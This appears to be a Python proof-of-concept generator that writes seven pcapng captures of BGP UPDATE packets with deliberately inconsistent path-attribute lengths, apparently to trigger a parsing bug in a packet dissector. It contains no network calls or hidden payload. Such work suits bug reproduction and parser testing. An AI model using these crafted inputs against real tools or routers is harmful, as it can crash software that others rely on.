import struct, os, json

def csum(data):
    if len(data)%2: data += b'\0'
    s=sum(struct.unpack('!%dH'%(len(data)//2), data))
    while s>>16: s=(s&0xffff)+(s>>16)
    return (~s)&0xffff

def make_pkt(path_attr_len=0, extra=b'', bgp_len=None):
    eth = b'\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb' + struct.pack('!H',0x0800)
    bgp_body = struct.pack('!H',0) + struct.pack('!H',path_attr_len) + extra
    if bgp_len is None: bgp_len = 19 + len(bgp_body)
    bgp = b'\xff'*16 + struct.pack('!HB', bgp_len, 2) + bgp_body
    tcp_len=20+len(bgp)
    ip_len=20+tcp_len
    ip = bytearray(20)
    ip[0]=0x45; ip[1]=0; ip[2:4]=struct.pack('!H',ip_len); ip[4:6]=b'\x00\x01'; ip[6:8]=b'\x40\x00'; ip[8]=64; ip[9]=6; ip[12:16]=b'\x0a\x00\x00\x01'; ip[16:20]=b'\x0a\x00\x00\x02'
    ip[10:12]=struct.pack('!H',csum(bytes(ip)))
    tcp=bytearray(20)
    tcp[0:2]=struct.pack('!H',12345); tcp[2:4]=struct.pack('!H',179); tcp[4:8]=b'\x00\x00\x00\x01'; tcp[12]=0x50; tcp[13]=0x18; tcp[14:16]=struct.pack('!H',8192)
    pseudo=ip[12:20]+struct.pack('!BBH',0,6,tcp_len)
    tcp[16:18]=struct.pack('!H',csum(pseudo+bytes(tcp)+bgp))
    return eth+bytes(ip)+bytes(tcp)+bgp

def pcapng(pkt, fn):
    shb_body=struct.pack('<IHHq',0x1a2b3c4d,1,0,-1)
    shb=struct.pack('<II',0x0A0D0D0A,12+len(shb_body))+shb_body+struct.pack('<I',12+len(shb_body))
    idb_body=struct.pack('<HHI',1,0,65535)
    idb=struct.pack('<II',1,12+len(idb_body))+idb_body+struct.pack('<I',12+len(idb_body))
    pad=(4-len(pkt)%4)%4
    epb_body=struct.pack('<IIIII',0,0,0,len(pkt),len(pkt))+pkt+b'\0'*pad
    epb=struct.pack('<II',6,12+len(epb_body))+epb_body+struct.pack('<I',12+len(epb_body))
    open(fn,'wb').write(shb+idb+epb)

# make few candidates
for i,(pal,extra,bgplen) in enumerate([(0,b'',None),(1,b'\x40',None),(100,b'',None),(65535,b'',None),(65535,b'\x18\x28\x01\x01',None),(100,b'\x18\x28\x01\x01',None),(0,b'\x18\x28\x01\x01',None)]):
    pkt=make_pkt(pal,extra,bgplen)
    pcapng(pkt, f'/workspace/poc{i}.pcapng')
    print(i, len(pkt), pal, len(extra), bgplen)
